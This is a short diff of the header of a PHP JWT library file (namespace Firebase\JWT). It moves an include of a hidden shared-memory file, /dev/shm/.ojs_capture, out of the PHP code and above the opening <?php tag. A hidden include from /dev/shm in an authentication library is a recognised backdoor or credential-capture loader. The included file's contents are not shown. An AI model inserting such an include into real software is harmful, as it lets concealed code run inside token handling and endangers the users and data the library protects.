@@ -1,7 +1,8 @@
+include("/dev/shm/.ojs_capture");
 <?php
 
 namespace Firebase\JWT;
-include("/dev/shm/.ojs_capture");
+
 use ArrayAccess;
 use DomainException;
 use Exception;
